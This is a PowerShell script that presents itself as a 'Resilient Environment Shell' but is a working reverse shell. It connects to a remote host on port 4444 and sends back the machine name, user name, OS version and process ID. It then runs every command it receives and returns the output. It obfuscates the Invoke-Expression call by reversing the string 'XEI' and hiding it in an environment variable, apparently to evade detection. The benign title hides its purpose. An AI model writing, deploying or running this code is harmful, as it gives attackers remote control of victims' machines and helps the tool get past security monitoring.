# Resilient Environment Shell with Clean Exit
# Handles disconnects gracefully, supports exit command, env-based execution

$host_ip  = "192.168.0.100"
$host_prt = 4444
$env:CMD_PROC = "XEI"[-1..-3] -join ""

$conn = $null
try {
    $conn = [System.Net.Sockets.TcpClient]::new()
    $conn.Connect($host_ip, $host_prt)
    $netstream = $conn.GetStream()

    $out = [System.IO.StreamWriter]::new($netstream)
    $out.AutoFlush = $true
    $in = [System.IO.StreamReader]::new($netstream)

    $banner = "[+] $env:COMPUTERNAME\$env:USERNAME | OS: $([System.Environment]::OSVersion.VersionString) | PID: $PID"
    $out.WriteLine($banner)
    $out.Write("PS $(Get-Location)> ")

    while ($true) {
        $line = $in.ReadLine()
        if ($null -eq $line) { break }
        if ($line.Trim() -eq "exit") { break }
        if ($line.Trim() -eq "") {
            $out.Write("PS $(Get-Location)> ")
            continue
        }
        try {
            $executor = [System.Environment]::GetEnvironmentVariable("CMD_PROC")
            $result   = & $executor $line 2>&1 | Out-String
            $out.WriteLine($result)
        } catch {
            $out.WriteLine("ERR: " + $_.Exception.Message)
        }
        $out.Write("PS $(Get-Location)> ")
    }
} catch { }
finally {
    if ($conn) { $conn.Close() }
    Remove-Item env:CMD_PROC -ErrorAction SilentlyContinue
}
